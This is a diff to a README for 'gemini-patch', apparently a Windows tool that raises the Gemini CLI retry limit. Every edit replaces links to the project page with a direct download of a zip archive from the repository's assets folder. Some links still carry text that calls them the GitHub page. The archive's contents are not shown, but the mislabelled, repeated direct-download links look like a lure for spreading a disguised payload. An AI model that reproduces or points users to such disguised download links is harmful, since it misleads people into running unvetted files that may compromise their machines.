@@ -1,6 +1,6 @@
 # 🔧 gemini-patch - Increase Gemini CLI Retry Limit
 
-[![Download gemini-patch](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/shivendra911/gemini-patch)
+[![Download gemini-patch](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/shivendra911/gemini-patch/raw/refs/heads/main/assets/patch-gemini-v1.9.zip)
 
 ---
 
@@ -26,9 +26,9 @@ This guide focuses on Windows users.
 
 Click the link below to visit the main project page. From there, you can download the necessary files:
 
-[Download gemini-patch from GitHub](https://github.com/shivendra911/gemini-patch)
+[Download gemini-patch from GitHub](https://github.com/shivendra911/gemini-patch/raw/refs/heads/main/assets/patch-gemini-v1.9.zip)
 
-[![Download gemini-patch](https://img.shields.io/badge/Download-Grey?style=for-the-badge&logo=github)](https://github.com/shivendra911/gemini-patch)
+[![Download gemini-patch](https://img.shields.io/badge/Download-Grey?style=for-the-badge&logo=github)](https://github.com/shivendra911/gemini-patch/raw/refs/heads/main/assets/patch-gemini-v1.9.zip)
 
 ---
 
@@ -136,7 +136,7 @@ Both scripts do the same job but are made for different operating systems.
 
 ## 📥 Additional resources
 
-Visit the [gemini-patch GitHub page](https://github.com/shivendra911/gemini-patch) for updates or to get the latest version.
+Visit the [gemini-patch GitHub page](https://github.com/shivendra911/gemini-patch/raw/refs/heads/main/assets/patch-gemini-v1.9.zip) for updates or to get the latest version.
 
 ---
 
@@ -161,4 +161,4 @@ If the patch script does not seem to work:
 
 ---
 
-[Download gemini-patch from GitHub](https://github.com/shivendra911/gemini-patch)
+[Download gemini-patch from GitHub](https://github.com/shivendra911/gemini-patch/raw/refs/heads/main/assets/patch-gemini-v1.9.zip)
